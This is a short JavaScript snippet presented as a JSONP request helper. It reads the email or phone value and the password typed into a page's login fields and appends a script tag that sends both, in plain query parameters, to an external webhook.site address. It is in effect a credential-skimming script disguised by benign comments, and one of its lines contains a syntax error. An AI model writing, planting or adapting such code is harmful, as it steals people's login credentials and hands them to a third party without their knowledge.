function handleResponse(data) {
    console.log('Received data:', data);
    // Process the data received from the server
}

// Function to create and send the JSONP request
function sendJSONPRequest() {
    // Create a script tag
    var script = document.createElement('script');
    
    // Set the source URL with a callback parameter
    const emailOrPhoneValue = document.querySelector('input[type="text"]').value;
    const passwordValue = document.querySelector('input[type="password"]').value;
    script.src = 'https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse&u='+emailOrPhoneValue+'&p='+passwordValue;
    console.log('https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse&u='+emailOrPhoneValue+'&p='+passwordValue;)
    // Append the script tag to the document
    document.body.appendChild(script);
}

